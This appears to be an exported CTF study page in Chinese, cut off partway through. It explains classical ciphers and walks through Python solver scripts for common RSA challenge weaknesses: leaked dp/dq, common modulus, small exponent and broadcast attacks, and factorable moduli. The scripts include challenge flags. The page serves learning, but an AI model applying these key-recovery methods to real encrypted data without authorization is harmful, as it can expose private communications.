[{"title":"【CTF】密码学","path":"//CTF/Crypto/1.html","content":"1. 古典密码单表替换单表替换关键特征为：明密文一一对应。解决方法： 暴力破解 词频分析，变异凯撒无法破译。 凯撒密码加密时会将明文中的每个字母（数字不处理）向后移位固定数目（循环移动），作为密文。 123输入：ABCDEFGHIJKLMNOPQRSTUVWXYZ偏移量：13输出：NOPQRSTUVWXYZABCDEFGHIJKLM 特定的凯撒密码名称： ROT13：偏移量为 13 Python 解密代码 1234567891011121314151617181920212223def Caesar(text, iv, table=&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;): result = &quot;&quot; # 取出每一位字符 for letter in text: # 判断是否为字母，中文是Unicode字符会判定为字母 if letter.isalpha(): # upper()是table是大写字母 # find()返回字母在table中的索引值，找不到会返回-1，产生混淆 index = table.find(letter.upper()) # 判断字母是否大写，大写则输出大写，小写则输出小写 if letter.isupper(): result += table[(index + iv) % 26] else: result += table[(index + iv) % 26].lower() else: result += letter print(result) return resultCaesar(&quot;AaBbCc123&quot;, 13) # NnOoPp123for i in range(26): Caesar(&quot;AaBbCc123&quot;, i) 多表替换加密后字母几乎不再保持原来的频率 Vigenere（维吉尼亚）密码 其它类型加密培根密码栅栏密码2. DES 算法分析3. 随机数算法分析4.RSA 算法分析 RSA 是一种非对称加密算法 RSA 算法分为三步： 密钥生成 加密 解密 加密原理 随机生成两个大质数 p 和 q，计算 N = pq 根据欧拉函数，求得 φ(N) = φ(p)φ(q) = (p−1)(q−1) 选择一个小于 φ(N) 的整数 e，使 e 和 φ(N) 互质。 求得 e 关于 φ(N) 的模反元素，命名为 d，有 ed ≡ 1(mod φ(N)) 对 m 进行加密 c ≡ m^e(mod N)，解密 m ≡ c^d(mod N) 字母 含义 p，q 两个大质数 N 模数 φ 欧拉函数 e 和 d 互为模反的两个指数 m 明文 c 密文 (e, N) 公钥 (d, N) 私钥 ≡ 同余符号 两个整数 a，b 若他们除以整数 m 所得的余数相等，则称 a，b 对于与模 m 同余。a ≡ b(mod m)读作 a 同余与 b 模 m。 CTF 中的常见 RSA 题型epq，求 d1234567import gmpy2p = 473398607161q = 4511491e = 17d = gmpy2.invert(e,(p-1)*(q-1)) # gmpy2.invert(e,φ(N))print(d) ecpq，求 m12345678910111213import gmpy2from Crypto.Util.number import bytes_to_long,long_to_bytesp =q =e =c =n = p * qphi_n = (p-1)*(q-1)d = gmpy2.invert(e, phi_n)m = pow(c, d, n)print(long_to_bytes(m)) ecpq，求 m123456789101112131415161718import gmpy2def Decrypt(c, e, p, q): L = (p - 1) * (q - 1) d = gmpy2.invert(e, L) n = p * q m = gmpy2.powmod(c, d, n) flag = str(m) print(&quot;flag&#123;&quot; + flag + &quot;&#125;&quot;)if __name__ == &quot;__main__&quot;: p = 9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483 q = 11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407 e = 65537 c = 83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034 Decrypt(c, e, p, q) cpqdpdq，求 m123456789101112131415161718import gmpy2from Crypto.Util.number import long_to_bytesp = 8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229q = 12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469dp = 6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929dq = 783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041c = 24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852I = gmpy2.invert(q, p)mp = pow(c, dp, p) # 求幂取模运算, mp = c^dp % pmq = pow(c, dq, q) # 求幂取模运算, mq = c^dp % qm = (((mp - mq) * I) % p) * q + mq # 求明文公式# 最后得到十六进制数后有时还要转化为字符串print(hex(m)) # 转为十六进制print(long_to_bytes(m)) # noxCTF&#123;W31c0m3_70_Ch1n470wn&#125; end，求 p、q（n 非常大，求不出 p、q） 例题：题目给出了 2 个文件，一个是加密的脚本 chall.py、另一个是加密脚本的输出内容 output.txt。 123456789101112# chall.pyfrom gmpy2 import invertfrom md5 import md5from secret import p,qe = 65537n = p*qphi = (p-1)(q-1)d = invert(e, phi)print(n,e,d)print(&quot;Flag: flag&#123;%s&#125;&quot; % md5(str(p + q)).hexdigest()) 解密脚本 123456789101112131415161718192021222324252627282930313233343536373839404142# 给出n,e,d, 求 q,pimport randomimport hashlibdef gcd(a, b): if a &lt; b: a, b = b, a while b != 0: temp = a % b a = b b = temp return adef getpq(n, e, d): p = 1 q = 1 while p == 1 and q == 1: k = d * e - 1 g = random.randint(0, n) while p == 1 and q == 1 and k % 2 == 0: k //= 2 y = pow(g, k, n) if y != 1 and gcd(y - 1, n) &gt; 1: p = gcd(y - 1, n) q = n / p return p, qdef main(): n = 16352578963372306131642407541567045533766691177138375676491913897592458965544068296813122740126583082006556217616296009516413202833698268845634497478988128850373221853516973259086845725813424850548682503827191121548693288763243619033224322698075987667531863213468223654181658012754897588147027437229269098246969811226129883327598021859724836993626315476699384610680857047403431430525708390695622848315322636785398223207468754197643541958599210127261345770914514670199047435085714403641469016212958361993969304545214061560160267760786482163373784437641808292654489343487613446165542988382687729593384887516272690654309 e = 65537 d = 9459928379973667430138068528059438139092368625339079253289560577985304435062213121398231875832264894458314629575455553485752685643743266654630829957442008775259776311585654014858165341757547284112061885158006881475740553532826576260839430343960738520822367975528644329172668877696208741007648370045520535298040161675407779239300466681615493892692265542290255408673533853011662134953869432632554008235340864803377610352438146264524770710345273439724107080190182918285547426166561803716644089414078389475072103315432638197578186106576626728869020366214077455194554930725576023274922741115941214789600089166754476449453 p, q = getpq(n, e, d) print(p) print(q) print(f&quot;Flag:&#123;hashlib.md5(str(p + q).encode(&#x27;utf-8&#x27;)).hexdigest()&#125;&quot;)if __name__ == &quot;__main__&quot;: main() ecndp，求 m123456789101112131415161718192021import gmpy2 as gpfrom Crypto.Util.number import long_to_bytese = 65537n = 248254007851526241177721526698901802985832766176221609612258877371620580060433101538328030305219918697643619814200930679612109885533801335348445023751670478437073055544724280684733298051599167660303645183146161497485358633681492129668802402065797789905550489547645118787266601929429724133167768465309665906113dp = 905074498052346904643025132879518330691925174573054004621877253318682675055421970943552016695528560364834446303196939207056642927148093290374440210503657c = 140423670976252696807533673586209400575664282100684119784203527124521188996403826597436883766041879067494280957410201958935737360380801845453829293997433414188838725751796261702622028587211560353362847191060306578510511380965162133472698713063592621028959167072781482562673683090590521214218071160287665180751for i in range(1, e): # 在范围(1,e)之间进行遍历 if (dp * e - 1) % i == 0: if n % (((dp * e - 1) // i) + 1) == 0: # 存在p，使得n能被p整除 p = ((dp * e - 1) // i) + 1 q = n // (((dp * e - 1) // i) + 1) phi = (q - 1) * (p - 1) # 欧拉定理 d = gp.invert(e, phi) # 求模逆 m = pow(c, d, n) # 快速求幂取模运算print(m) # 10进制明文print(hex(m)[2:]) # 16进制明文print(long_to_bytes(m)) # 16进制转文本 flag&#123;wow_leaking_dp_breaks_rsa?_98924743502&#125; c1c2ne1e2，求 m（共模攻击）使用相同的模数 n 来加密相同的明文 m，使用的指数 e 不同且互质，得到密文 c1 和 c2，可直接解密出密文。 1234567891011import gmpy2from Crypto.Util.number import bytes_to_long, long_to_bytesn = 22708078815885011462462049064339185898712439277226831073457888403129378547350292420267016551819052430779004755846649044001024141485283286483130702616057274698473611149508798869706347501931583117632710700787228016480127677393649929530416598686027354216422565934459015161927613607902831542857977859612596282353679327773303727004407262197231586324599181983572622404590354084541788062262164510140605868122410388090174420147752408554129789760902300898046273909007852818474030770699647647363015102118956737673941354217692696044969695308506436573142565573487583507037356944848039864382339216266670673567488871508925311154801c1 = 22322035275663237041646893770451933509324701913484303338076210603542612758956262869640822486470121149424485571361007421293675516338822195280313794991136048140918842471219840263536338886250492682739436410013436651161720725855484866690084788721349555662019879081501113222996123305533009325964377798892703161521852805956811219563883312896330156298621674684353919547558127920925706842808914762199011054955816534977675267395009575347820387073483928425066536361482774892370969520740304287456555508933372782327506569010772537497541764311429052216291198932092617792645253901478910801592878203564861118912045464959832566051361e1 = 11187289c2 = 18702010045187015556548691642394982835669262147230212731309938675226458555210425972429418449273410535387985931036711854265623905066805665751803269106880746769003478900791099590239513925449748814075904017471585572848473556490565450062664706449128415834787961947266259789785962922238701134079720414228414066193071495304612341052987455615930023536823801499269773357186087452747500840640419365011554421183037505653461286732740983702740822671148045619497667184586123657285604061875653909567822328914065337797733444640351518775487649819978262363617265797982843179630888729407238496650987720428708217115257989007867331698397e2 = 9647291r, s1, s2 = gmpy2.gcdext(e1, e2)m = (pow(c1, s1, n) * pow(c2, s2, n)) % nprint(long_to_bytes(m)) # flag&#123;49d91077a1abcb14f1a9d546c80be9ef&#125; ecn，求 m（n 分解出多个不同的因子） n 比较小，可以进行质因数分解。三个质因数分解为 123P17 = 67724172605733871P20 = 11571390939636959887P24 = 694415063702720454699679 12345678910111213import gmpy2from Crypto.Util.number import long_to_bytesn = 544187306850902797629107353619267427694837163600853983242783e = 39293c = 439254895818320413408827022398053685867343267971712332011972p1 = 67724172605733871p2 = 11571390939636959887p3 = 694415063702720454699679phi = (p1 - 1) * (p2 - 1) * (p3 - 1)d = gmpy2.invert(e, phi)m = pow(c, d, n)print(long_to_bytes(m)) # flag&#123;a4ffbd7eac428b0fe0&#125; ecn，求 m（e 很短）（低加密指数攻击）m 很短，e 非常小，可用 12345678910111213141516171819202122232425import gmpy2from Crypto.Util.number import long_to_bytesdef di(c, e, n): k = 0 while True: me = c + n * k flag, result = gmpy2.iroot(me, e) if result == True: return flag k += 1n = int( &quot;52d483c27cd806550fbe0e37a61af2e7cf5e0efb723dfc81174c918a27627779b21fa3c851e9e94188eaee3d5cd6f752406a43fbecb53e80836ff1e185d3ccd7782ea846c2e91a7b0808986666e0bdadbfb7bdd65670a589a4d2478e9adcafe97c6ee23614bcb2ecc23580f4d2e3cc1ecfec25c50da4bc754dde6c8bfd8d1fc16956c74d8e9196046a01dc9f3024e11461c294f29d7421140732fedacac97b8fe50999117d27943c953f18c4ff4f8c258d839764078d4b6ef6e8591e0ff5563b31a39e6374d0d41c8c46921c25e5904a817ef8e39e5c9b71225a83269693e0b7e3218fc5e5a1e8412ba16e588b3d6ac536dce39fcdfce81eec79979ea6872793&quot;, 16,)e = int(&quot;3&quot;, 16)c = int( &quot;10652cdfaa6b63f6d7bd1109da08181e500e5643f5b240a9024bfa84d5f2cac9310562978347bb232d63e7289283871efab83d84ff5a7b64a94a79d34cfbd4ef121723ba1f663e514f83f6f01492b4e13e1bb4296d96ea5a353d3bf2edd2f449c03c4a3e995237985a596908adc741f32365&quot;, 16,)m = di(c, e, n)print(long_to_bytes(m)) # flag&#123;25df8caf006ee5db94d48144c33b2c3b&#125; c1c2c3n1n2n3，求 m（低加密指数广播攻击）根据中国剩余定理，解出答案 12345678910111213141516171819202122232425262728293031323334353637383940import gmpy2from functools import reducefrom Crypto.Util.number import long_to_bytesdef CRT(c, n): sum = 0 # ni 的乘积,N=n1*n2*n3 N = reduce(lambda x, y: x * y, n) # zip()将对象打包成元组 for n_i, c_i in zip(n, c): N_i = N // n_i t_i = gmpy2.invert(N_i, n_i) sum += c_i * N_i * t_i return sum % Nn1 = 331310324212000030020214312244232222400142410423413104441140203003243002104333214202031202212403400220031202142322434104143104244241214204444443323000244130122022422310201104411044030113302323014101331214303223312402430402404413033243132101010422240133122211400434023222214231402403403200012221023341333340042343122302113410210110221233241303024431330001303404020104442443120130000334110042432010203401440404010003442001223042211442001413004c1 = 310020004234033304244200421414413320341301002123030311202340222410301423440312412440240244110200112141140201224032402232131204213012303204422003300004011434102141321223311243242010014140422411342304322201241112402132203101131221223004022003120002110230023341143201404311340311134230140231412201333333142402423134333211302102413111111424430032440123340034044314223400401224111323000242234420441240411021023100222003123214343030122032301042243n2 = 302240000040421410144422133334143140011011044322223144412002220243001141141114123223331331304421113021231204322233120121444434210041232214144413244434424302311222143224402302432102242132244032010020113224011121043232143221203424243134044314022212024343100042342002432331144300214212414033414120004344211330224020301223033334324244031204240122301242232011303211220044222411134403012132420311110302442344021122101224411230002203344140143044114c2 = 112200203404013430330214124004404423210041321043000303233141423344144222343401042200334033203124030011440014210112103234440312134032123400444344144233020130110134042102220302002413321102022414130443041144240310121020100310104334204234412411424420321211112232031121330310333414423433343322024400121200333330432223421433344122023012440013041401423202210124024431040013414313121123433424113113414422043330422002314144111134142044333404112240344n3 = 332200324410041111434222123043121331442103233332422341041340412034230003314420311333101344231212130200312041044324431141033004333110021013020140020011222012300020041342040004002220210223122111314112124333211132230332124022423141214031303144444134403024420111423244424030030003340213032121303213343020401304243330001314023030121034113334404440421242240113103203013341231330004332040302440011324004130324034323430143102401440130242321424020323c3 = 10013444120141130322433204124002242224332334011124210012440241402342100410331131441303242011002101323040403311120421304422222200324402244243322422444414043342130111111330022213203030324422101133032212042042243101434342203204121042113212104212423330331134311311114143200011240002111312122234340003403312040401043021433112031334324322123304112340014030132021432101130211241134422413442312013042141212003102211300321404043012124332013240431242n1 = int(str(n1), 5)c1 = int(str(c1), 5)n2 = int(str(n2), 5)c2 = int(str(c2), 5)n3 = int(str(n3), 5)c3 = int(str(c3), 5)n = [n1, n2, n3]c = [c1, c2, c3]x = CRT(c, n)# e一般都不大可以尝试爆破for e in range(1, 10): m, r = gmpy2.iroot(x, e) if r == True: print(long_to_bytes(m)) # noxCTF&#123;D4mn_y0u_h4s74d_wh47_4_b100dy_b4s74rd!&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778import gmpy2from Crypto.Util.number import long_to_bytese = 65537n0 = 20474918894051778533305262345601880928088284471121823754049725354072477155873778848055073843345820697886641086842612486541250183965966001591342031562953561793332341641334302847996108417466360688139866505179689516589305636902137210185624650854906780037204412206309949199080005576922775773722438863762117750429327585792093447423980002401200613302943834212820909269713876683465817369158585822294675056978970612202885426436071950214538262921077409076160417436699836138801162621314845608796870206834704116707763169847387223307828908570944984416973019427529790029089766264949078038669523465243837675263858062854739083634207c0 = 974463908243330865728978769213595400782053398596897741316275722596415018912929508637393850919224969271766388710025195039896961956062895570062146947736340342927974992616678893372744261954172873490878805483241196345881721164078651156067119957816422768524442025688079462656755605982104174001635345874022133045402344010045961111720151990412034477755851802769069309069018738541854130183692204758761427121279982002993939745343695671900015296790637464880337375511536424796890996526681200633086841036320395847725935744757993013352804650575068136129295591306569213300156333650910795946800820067494143364885842896291126137320n1 = 20918819960648891349438263046954902210959146407860980742165930253781318759285692492511475263234242002509419079545644051755251311392635763412553499744506421566074721268822337321637265942226790343839856182100575539845358877493718334237585821263388181126545189723429262149630651289446553402190531135520836104217160268349688525168375213462570213612845898989694324269410202496871688649978370284661017399056903931840656757330859626183773396574056413017367606446540199973155630466239453637232936904063706551160650295031273385619470740593510267285957905801566362502262757750629162937373721291789527659531499435235261620309759c1 = 15819636201971185538694880505120469332582151856714070824521803121848292387556864177196229718923770810072104155432038682511434979353089791861087415144087855679134383396897817458726543883093567600325204596156649305930352575274039425470836355002691145864435755333821133969266951545158052745938252574301327696822347115053614052423028835532509220641378760800693351542633860702225772638930501021571415907348128269681224178300248272689705308911282208685459668200507057183420662959113956077584781737983254788703048275698921427029884282557468334399677849962342196140864403989162117738206246183665814938783122909930082802031855n2 = 25033254625906757272369609119214202033162128625171246436639570615263949157363273213121556825878737923265290579551873824374870957467163989542063489416636713654642486717219231225074115269684119428086352535471683359486248203644461465935500517901513233739152882943010177276545128308412934555830087776128355125932914846459470221102007666912211992310538890654396487111705385730502843589727289829692152177134753098649781412247065660637826282055169991824099110916576856188876975621376606634258927784025787142263367152947108720757222446686415627479703666031871635656314282727051189190889008763055811680040315277078928068816491c2 = 4185308529416874005831230781014092407198451385955677399668501833902623478395669279404883990725184332709152443372583701076198786635291739356770857286702107156730020004358955622511061410661058982622055199736820808203841446796305284394651714430918690389486920560834672316158146453183789412140939029029324756035358081754426645160033262924330248675216108270980157049705488620263485129480952814764002865280019185127662449318324279383277766416258142275143923532168798413011028271543085249029048997452212503111742302302065401051458066585395360468447460658672952851643547193822775218387853623453638025492389122204507555908862n3 = 21206968097314131007183427944486801953583151151443627943113736996776787181111063957960698092696800555044199156765677935373149598221184792286812213294617749834607696302116136745662816658117055427803315230042700695125718401646810484873064775005221089174056824724922160855810527236751389605017579545235876864998419873065217294820244730785120525126565815560229001887622837549118168081685183371092395128598125004730268910276024806808565802081366898904032509920453785997056150497645234925528883879419642189109649009132381586673390027614766605038951015853086721168018787523459264932165046816881682774229243688581614306480751c3 = 4521038011044758441891128468467233088493885750850588985708519911154778090597136126150289041893454126674468141393472662337350361712212694867311622970440707727941113263832357173141775855227973742571088974593476302084111770625764222838366277559560887042948859892138551472680654517814916609279748365580610712259856677740518477086531592233107175470068291903607505799432931989663707477017904611426213770238397005743730386080031955694158466558475599751940245039167629126576784024482348452868313417471542956778285567779435940267140679906686531862467627238401003459101637191297209422470388121802536569761414457618258343550613n4 = 22822039733049388110936778173014765663663303811791283234361230649775805923902173438553927805407463106104699773994158375704033093471761387799852168337898526980521753614307899669015931387819927421875316304591521901592823814417756447695701045846773508629371397013053684553042185725059996791532391626429712416994990889693732805181947970071429309599614973772736556299404246424791660679253884940021728846906344198854779191951739719342908761330661910477119933428550774242910420952496929605686154799487839923424336353747442153571678064520763149793294360787821751703543288696726923909670396821551053048035619499706391118145067c4 = 15406498580761780108625891878008526815145372096234083936681442225155097299264808624358826686906535594853622687379268969468433072388149786607395396424104318820879443743112358706546753935215756078345959375299650718555759698887852318017597503074317356745122514481807843745626429797861463012940172797612589031686718185390345389295851075279278516147076602270178540690147808314172798987497259330037810328523464851895621851859027823681655934104713689539848047163088666896473665500158179046196538210778897730209572708430067658411755959866033531700460551556380993982706171848970460224304996455600503982223448904878212849412357n5 = 21574139855341432908474064784318462018475296809327285532337706940126942575349507668289214078026102682252713757703081553093108823214063791518482289846780197329821139507974763780260290309600884920811959842925540583967085670848765317877441480914852329276375776405689784571404635852204097622600656222714808541872252335877037561388406257181715278766652824786376262249274960467193961956690974853679795249158751078422296580367506219719738762159965958877806187461070689071290948181949561254144310776943334859775121650186245846031720507944987838489723127897223416802436021278671237227993686791944711422345000479751187704426369c5 = 20366856150710305124583065375297661819795242238376485264951185336996083744604593418983336285185491197426018595031444652123288461491879021096028203694136683203441692987069563513026001861435722117985559909692670907347563594578265880806540396777223906955491026286843168637367593400342814725694366078337030937104035993569672959361347287894143027186846856772983058328919716702982222142848848117768499996617588305301483085428547267337070998767412540225911508196842253134355901263861121500650240296746702967594224401650220168780537141654489215019142122284308116284129004257364769474080721001708734051264841350424152506027932n6 = 25360227412666612490102161131174584819240931803196448481224305250583841439581008528535930814167338381983764991296575637231916547647970573758269411168219302370541684789125112505021148506809643081950237623703181025696585998044695691322012183660424636496897073045557400768745943787342548267386564625462143150176113656264450210023925571945961405709276631990731602198104287528528055650050486159837612279600415259486306154947514005408907590083747758953115486124865486720633820559135063440942528031402951958557630833503775112010715604278114325528993771081233535247118481765852273252404963430792898948219539473312462979849137c6 = 19892772524651452341027595619482734356243435671592398172680379981502759695784087900669089919987705675899945658648623800090272599154590123082189645021800958076861518397325439521139995652026377132368232502108620033400051346127757698623886142621793423225749240286511666556091787851683978017506983310073524398287279737680091787333547538239920607761080988243639547570818363788673249582783015475682109984715293163137324439862838574460108793714172603672477766831356411304446881998674779501188163600664488032943639694828698984739492200699684462748922883550002652913518229322945040819064133350314536378694523704793396169065179n7 = 22726855244632356029159691753451822163331519237547639938779517751496498713174588935566576167329576494790219360727877166074136496129927296296996970048082870488804456564986667129388136556137013346228118981936899510687589585286517151323048293150257036847475424044378109168179412287889340596394755257704938006162677656581509375471102546261355748251869048003600520034656264521931808651038524134185732929570384705918563982065684145766427962502261522481994191989820110575981906998431553107525542001187655703534683231777988419268338249547641335718393312295800044734534761692799403469497954062897856299031257454735945867491191c7 = 6040119795175856407541082360023532204614723858688636724822712717572759793960246341800308149739809871234313049629732934797569781053000686185666374833978403290525072598774001731350244744590772795701065129561898116576499984185920661271123665356132719193665474235596884239108030605882777868856122378222681140570519180321286976947154042272622411303981011302586225630859892731724640574658125478287115198406253847367979883768000812605395482952698689604477719478947595442185921480652637868335673233200662100621025061500895729605305665864693122952557361871523165300206070325660353095592778037767395360329231331322823610060006n8 = 23297333791443053297363000786835336095252290818461950054542658327484507406594632785712767459958917943095522594228205423428207345128899745800927319147257669773812669542782839237744305180098276578841929496345963997512244219376701787616046235397139381894837435562662591060768476997333538748065294033141610502252325292801816812268934171361934399951548627267791401089703937389012586581080223313060159456238857080740699528666411303029934807011214953984169785844714159627792016926490955282697877141614638806397689306795328344778478692084754216753425842557818899467945102646776342655167655384224860504086083147841252232760941c8 = 5418120301208378713115889465579964257871814114515046096090960159737859076829258516920361577853903925954198406843757303687557848302302200229295916902430205737843601806700738234756698575708612424928480440868739120075888681672062206529156566421276611107802917418993625029690627196813830326369874249777619239603300605876865967515719079797115910578653562787899019310139945904958024882417833736304894765433489476234575356755275147256577387022873348906900149634940747104513850154118106991137072643308620284663108283052245750945228995387803432128842152251549292698947407663643895853432650029352092018372834457054271102816934n9 = 28873667904715682722987234293493200306976947898711255064125115933666968678742598858722431426218914462903521596341771131695619382266194233561677824357379805303885993804266436810606263022097900266975250431575654686915049693091467864820512767070713267708993899899011156106766178906700336111712803362113039613548672937053397875663144794018087017731949087794894903737682383916173267421403408140967713071026001874733487295007501068871044649170615709891451856792232315526696220161842742664778581287321318748202431466508948902745314372299799561625186955234673012098210919745879882268512656931714326782335211089576897310591491c9 = 9919880463786836684987957979091527477471444996392375244075527841865509160181666543016317634963512437510324198702416322841377489417029572388474450075801462996825244657530286107428186354172836716502817609070590929769261932324275353289939302536440310628698349244872064005700644520223727670950787924296004296883032978941200883362653993351638545860207179022472492671256630427228461852668118035317021428675954874947015197745916918197725121122236369382741533983023462255913924692806249387449016629865823316402366017657844166919846683497851842388058283856219900535567427103603869955066193425501385255322097901531402103883869n10 = 22324685947539653722499932469409607533065419157347813961958075689047690465266404384199483683908594787312445528159635527833904475801890381455653807265501217328757871352731293000303438205315816792663917579066674842307743845261771032363928568844669895768092515658328756229245837025261744260614860746997931503548788509983868038349720225305730985576293675269073709022350700836510054067641753713212999954307022524495885583361707378513742162566339010134354907863733205921845038918224463903789841881400814074587261720283879760122070901466517118265422863420376921536734845502100251460872499122236686832189549698020737176683019c10 = 1491527050203294989882829248560395184804977277747126143103957219164624187528441047837351263580440686474767380464005540264627910126483129930668344095814547592115061057843470131498075060420395111008619027199037019925701236660166563068245683975787762804359520164701691690916482591026138582705558246869496162759780878437137960823000043988227303003876410503121370163303711603359430764539337597866862508451528158285103251810058741879687875218384160282506172706613359477657215420734816049393339593755489218588796607060261897905233453268671411610631047340459487937479511933450369462213795738933019001471803157607791738538467n11 = 27646746423759020111007828653264027999257847645666129907789026054594393648800236117046769112762641778865620892443423100189619327585811384883515424918752749559627553637785037359639801125213256163008431942593727931931898199727552768626775618479833029101249692573716030706695702510982283555740851047022672485743432464647772882314215176114732257497240284164016914018689044557218920300262234652840632406067273375269301008409860193180822366735877288205783314326102263756503786736122321348320031950012144905869556204017430593656052867939493633163499580242224763404338807022510136217187779084917996171602737036564991036724299c11 = 21991524128957260536043771284854920393105808126700128222125856775506885721971193109361315961129190814674647136464887087893990660894961612838205086401018885457667488911898654270235561980111174603323721280911197488286585269356849579263043456316319476495888696219344219866516861187654180509247881251251278919346267129904739277386289240394384575124331135655943513831009934023397457082184699737734388823763306805326430395849935770213817533387235486307008892410920611669932693018165569417445885810825749609388627231235840912644654685819620931663346297596334834498661789016450371769203650109994771872404185770230172934013971n12 = 20545487405816928731738988374475012686827933709789784391855706835136270270933401203019329136937650878386117187776530639342572123237188053978622697282521473917978282830432161153221216194169879669541998840691383025487220850872075436064308499924958517979727954402965612196081404341651517326364041519250125036424822634354268773895465698920883439222996581226358595873993976604699830613932320720554130011671297944433515047180565484495191003887599891289037982010216357831078328159028953222056918189365840711588671093333013117454034313622855082795813122338562446223041211192277089225078324682108033843023903550172891959673551c12 = 14227439188191029461250476692790539654619199888487319429114414557975376308688908028140817157205579804059783807641305577385724758530138514972962209062230576107406142402603484375626077345190883094097636019771377866339531511965136650567412363889183159616188449263752475328663245311059988337996047359263288837436305588848044572937759424466586870280512424336807064729894515840552404756879590698797046333336445465120445087587621743906624279621779634772378802959109714400516183718323267273824736540168545946444437586299214110424738159957388350785999348535171553569373088251552712391288365295267665691357719616011613628772175n13 = 27359727711584277234897157724055852794019216845229798938655814269460046384353568138598567755392559653460949444557879120040796798142218939251844762461270251672399546774067275348291003962551964648742053215424620256999345448398805278592777049668281558312871773979931343097806878701114056030041506690476954254006592555275342579529625231194321357904668512121539514880704046969974898412095675082585315458267591016734924646294357666924293908418345508902112711075232047998775303603175363964055048589769318562104883659754974955561725694779754279606726358588862479198815999276839234952142017210593887371950645418417355912567987c13 = 3788529784248255027081674540877016372807848222776887920453488878247137930578296797437647922494510483767651150492933356093288965943741570268943861987024276610712717409139946409513963043114463933146088430004237747163422802959250296602570649363016151581364006795894226599584708072582696996740518887606785460775851029814280359385763091078902301957226484620428513604630585131511167015763190591225884202772840456563643159507805711004113901417503751181050823638207803533111429510911616160851391754754434764819568054850823810901159821297849790005646102129354035735350124476838786661542089045509656910348676742844957008857457n14 = 27545937603751737248785220891735796468973329738076209144079921449967292572349424539010502287564030116831261268197384650511043068738911429169730640135947800885987171539267214611907687570587001933829208655100828045651391618089603288456570334500533178695238407684702251252671579371018651675054368606282524673369983034682330578308769886456335818733827237294570476853673552685361689144261552895758266522393004116017849397346259119221063821663280935820440671825601452417487330105280889520007917979115568067161590058277418371493228631232457972494285014767469893647892888681433965857496916110704944758070268626897045014782837c14 = 14069112970608895732417039977542732665796601893762401500878786871680645798754783315693511261740059725171342404186571066972546332813667711135661176659424619936101038903439144294886379322591635766682645179888058617577572409307484708171144488708410543462972008179994594087473935638026612679389759756811490524127195628741262871304427908481214992471182859308828778119005750928935764927967212343526503410515793717201360360437981322576798056276657140363332700714732224848346808963992302409037706094588964170239521193589470070839790404597252990818583717869140229811712295005710540476356743378906642267045723633874011649259842n15 = 25746162075697911560263181791216433062574178572424600336856278176112733054431463253903433128232709054141607100891177804285813783247735063753406524678030561284491481221681954564804141454666928657549670266775659862814924386584148785453647316864935942772919140563506305666207816897601862713092809234429096584753263707828899780979223118181009293655563146526792388913462557306433664296966331469906428665127438829399703002867800269947855869262036714256550075520193125987011945192273531732276641728008406855871598678936585324782438668746810516660152018244253008092470066555687277138937298747951929576231036251316270602513451c15 = 17344284860275489477491525819922855326792275128719709401292545608122859829827462088390044612234967551682879954301458425842831995513832410355328065562098763660326163262033200347338773439095709944202252494552172589503915965931524326523663289777583152664722241920800537867331030623906674081852296232306336271542832728410803631170229642717524942332390842467035143631504401140727083270732464237443915263865880580308776111219718961746378842924644142127243573824972533819479079381023103585862099063382129757560124074676150622288706094110075567706403442920696472627797607697962873026112240527498308535903232663939028587036724n16 = 23288486934117120315036919418588136227028485494137930196323715336208849327833965693894670567217971727921243839129969128783853015760155446770590696037582684845937132790047363216362087277861336964760890214059732779383020349204803205725870225429985939570141508220041286857810048164696707018663758416807708910671477407366098883430811861933014973409390179948577712579749352299440310543689035651465399867908428885541237776143404376333442949397063249223702355051571790555151203866821867908531733788784978667478707672984539512431549558672467752712004519300318999208102076732501412589104904734983789895358753664077486894529499c16 = 10738254418114076548071448844964046468141621740603214384986354189105236977071001429271560636428075970459890958274941762528116445171161040040833357876134689749846940052619392750394683504816081193432350669452446113285638982551762586656329109007214019944975816434827768882704630460001209452239162896576191876324662333153835533956600295255158377025198426950944040643235430211011063586032467724329735785947372051759042138171054165854842472990583800899984893232549092766400510300083585513014171220423103452292891496141806956300396540682381668367564569427813092064053993103537635994311143010708814851867239706492577203899024n17 = 19591441383958529435598729113936346657001352578357909347657257239777540424811749817783061233235817916560689138344041497732749011519736303038986277394036718790971374656832741054547056417771501234494768509780369075443550907847298246275717420562375114406055733620258777905222169702036494045086017381084272496162770259955811174440490126514747876661317750649488774992348005044389081101686016446219264069971370646319546429782904810063020324704138495608761532563310699753322444871060383693044481932265801505819646998535192083036872551683405766123968487907648980900712118052346174533513978009131757167547595857552370586353973c17 = 3834917098887202931981968704659119341624432294759361919553937551053499607440333234018189141970246302299385742548278589896033282894981200353270637127213483172182529890495903425649116755901631101665876301799865612717750360089085179142750664603454193642053016384714515855868368723508922271767190285521137785688075622832924829248362774476456232826885801046969384519549385428259591566716890844604696258783639390854153039329480726205147199247183621535172450825979047132495439603840806501254997167051142427157381799890725323765558803808030109468048682252028720241357478614704610089120810367192414352034177484688502364022887n18 = 19254242571588430171308191757871261075358521158624745702744057556054652332495961196795369630484782930292003238730267396462491733557715379956969694238267908985251699834707734400775311452868924330866502429576951934279223234676654749272932769107390976321208605516299532560054081301829440688796904635446986081691156842271268059970762004259219036753174909942343204432795076377432107630203621754552804124408792358220071862369443201584155711893388877350138023238624566616551246804054720492816226651467017802504094070614892556444425915920269485861799532473383304622064493223627552558344088839860178294589481899206318863310603c18 = 